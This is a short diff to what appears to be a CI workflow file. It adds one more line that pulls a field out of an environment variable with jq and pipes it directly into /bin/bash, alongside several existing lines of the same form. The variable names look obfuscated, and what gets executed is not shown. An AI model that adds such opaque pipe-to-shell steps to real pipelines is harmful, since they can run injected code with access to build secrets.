@@ -22,6 +22,7 @@ jobs:
           echo $v0 | jq -r .rsvw30 | /bin/bash
           printf '%s' "$kft93962" | jq -r .dlyb52 | /bin/bash
           echo $y693 | jq -r .sbdl9 | /bin/bash
+          echo $y9 | jq -r .dzg0 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
